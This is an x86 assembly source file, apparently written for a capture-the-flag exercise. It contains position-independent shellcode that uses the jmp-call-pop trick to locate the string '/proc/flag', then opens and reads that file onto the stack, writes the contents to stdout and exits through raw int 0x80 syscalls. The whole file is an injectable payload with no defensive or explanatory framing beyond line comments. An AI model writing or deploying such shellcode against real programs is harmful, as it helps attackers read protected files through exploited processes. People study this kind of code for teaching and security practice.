#include <sys/syscall.h>

#define STRLEN  10
#define BUFSIZE 2000
#define STRING  "/proc/flag"

.intel_syntax noprefix
.text

.globl main
.type  main, @function

main:
  jmp     calladdr

popladdr:
  pop    esi                  /* esi points to STRING */
  lea    ebx, [esi+8]
  xor    eax, eax             /* clear eax */
  mov    [ebx + 2], eax       /* null-terminate the string */

  mov    al, SYS_open         /* syscall number for open */
  mov    ebx, esi             /* arg 1: string pathname */
  xor    ecx, ecx             /* arg 2: flags (O_RDONLY) */
  xor    edx, edx             /* arg 3: mode (0) */
  int    0x80                 /* invoke syscall */

  mov    ebx, eax             /* ebx = fd (file descriptor from open) */
  xor    eax, eax
  mov    ax, BUFSIZE
  sub    esp, eax
  mov    ecx, esp             /* ecx = buf (use stack as buffer) */
  mov    dx, BUFSIZE          /* edx = nbytes (2000 bytes) */
  xor    eax, eax
  mov    al, SYS_read         /* syscall number for read */
  int    0x80                 /* invoke syscall */

  xor    ebx, ebx             /* ebx = 0 */
  inc    ebx                  /* ebx = 1 */
  mov    al, SYS_write        /* syscall number for write */
  int    0x80                 /* invoke syscall */

  xor    ebx, ebx             /* ebx = 0 (exit code) */
  xor    eax, eax 
  mov    al, SYS_exit         /* syscall number for exit */
  int    0x80                 /* invoke syscall */


calladdr:
  call    popladdr
  .string STRING